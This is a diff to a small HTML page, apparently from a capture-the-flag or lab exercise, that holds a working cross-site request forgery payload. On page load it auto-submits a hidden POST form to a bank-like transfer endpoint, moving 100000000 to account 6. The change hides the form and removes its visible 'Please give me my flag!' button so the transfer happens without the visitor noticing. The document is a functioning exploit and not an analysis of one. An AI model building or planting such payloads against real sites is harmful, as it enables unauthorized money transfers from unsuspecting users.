@@ -5,10 +5,9 @@
     <title>Auto-submit form</title>
   </head>
   <body onload="document.myForm.submit()">
-    <form action="http://svb:5003/transfer/1" method="POST" id="myForm">
+    <form action="http://svb:5003/transfer/1" method="POST" name="myForm" style="display:none;">
         <input type="text" name="account" value="6"/>
         <input type="text" name="amount" value="100000000"/>
-        <input type="submit" value="Please give me my flag!"/>
     </form>
   </body>
 </html>
